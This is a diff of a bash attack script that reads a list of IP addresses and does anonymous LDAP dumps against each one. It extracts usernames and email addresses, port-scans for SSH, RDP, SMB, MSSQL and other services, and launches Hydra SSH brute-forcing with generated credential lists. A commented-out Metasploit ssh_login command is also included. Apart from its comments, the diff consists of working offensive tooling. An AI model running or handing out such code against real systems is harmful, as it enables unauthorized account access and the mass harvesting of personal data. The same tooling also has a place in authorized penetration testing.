@@ -2,20 +2,22 @@
 for line in $(cat iplist)
 do
 
+#Get DN
 
 DN=$(timeout 3 python3 getdn.py $line 2> /dev/null | grep "dc=" | head -n 1 | cut -d " " -f 5 )
 
+#If no DN skip
 if [[ ! -z "$DN" ]];then
 echo "=============== [Info] ==============="
 echo $line
 echo $DN
 
+#from DN to URL
 urltmp=${DN//dc=/}
 url=${urltmp//,/.}
-
 echo $url
 
-
+#Full dump
 dump=$(timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null)
 
 
@@ -25,9 +27,9 @@ users=$(echo "$dump" | grep  "\<uid: " | cut -d " " -f 2)
 nbusers=$(echo "$users" | wc -l )
 echo "$nbusers Users"
 echo "$users" | head -n 10 
-
+if [ "$nbusers" -gt 10 ]; then 
 echo "..."
-
+fi
 echo "$users" > userlist
 
 
@@ -69,14 +71,13 @@ fi
 echo "$users" >> userlist
 
 
-
+#Grab Users via mail:
 
 users=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  | cut -d "@" -f 1)
 echo "========= [Users via mail] =========="
 nbusers=$(echo "$users" | wc -l )
 echo "$nbusers Users"
 echo "$users" | head -n 10 
-
 if [ "$nbusers" -gt 10 ]; then 
 echo "..."
 fi
@@ -87,7 +88,6 @@ echo "$users" >> userlist
 mails=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  )
 nbmails=$(echo "$mails" | wc -l )
 echo "============== [Mail] ==============="
-
 echo "$nbmails Mails"
 echo "$mails" | head -n 10 
 if [ "$nbmails" -gt 10 ]; then 
@@ -99,11 +99,17 @@ echo "$mails" >> mails
 
 sort userlist | uniq -i > users
 echo "=========== [Unique users] ==========="
-
 users=$(cat users)
-echo " Users"
+nbusers=$(echo "$users" | wc -l )
+echo "$nbusers Users"
 echo "$users" | head -n 10 
+if [ "$nbusers" -gt 10 ]; then 
 echo "..."
+fi
+
+
+
+#Scan services if users found
 
 if [[ ! -z "$users" ]];then
 echo "=========== [Scan Services] ==========="
@@ -118,6 +124,10 @@ afp_svc=$(echo "$scan_res" | grep "548/tcp  open")
 mssql_svc=$(echo "$scan_res" | grep "1433/tcp open")
 rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")
 
+
+#Bruteforce Services if found
+
+
 #if [[ ! -z "$ldap_svc" ]];then
 #echo "===> LDAP Open : Enum With Hydra Ldap_bruteforce (broken)"
 #bash create_user_password_list.sh $line > userpass
@@ -125,24 +135,21 @@ rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")
 #echo "===> LDAP Closed"
 #fi
 
+#SSH
 
 if [[ ! -z "$ssh_svc" ]];then
-
 echo "===> SSH Open : Enum With hydra ssh ? (yes/no)"
 #echo "===> SSH Open : Enum With MSF MODULE SSH_Login"
 echo "$(echo "$users" | wc -l ) Users"
 read -t 5 sshbrute
 if [ "$sshbrute" == "yes" ];then
-
 #msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set THREADS 10; exploit; exit;"
 bash create_user_password_list.sh > userpass
 hydra -C userpass -t 4 -V $line ssh
 else
-
 echo "===> SSH Bruteforce Aborted"
 fi
 else 
-
 echo "===> SSH Closed"
 fi
 
@@ -206,6 +213,7 @@ echo "===> RDP Closed"
 fi
 
 
+#Fast scan if no services found
 if [[ -z "$ssh_svc" && -z "$smtp_svc" && -z "$kerb_svc" && -z "$smb_svc" && -z "$afp_svc" && -z "$mssql_svc" && -z "$rdp_svc" ]]; then
 echo "============= [Fast Scan] ============="
 nmap $line  -F| grep open
@@ -213,6 +221,8 @@ fi
 
 else 
 
+
+#Full dump if no users found
 echo "============= [Full Dump] ============="
 echo "$dump" 
 
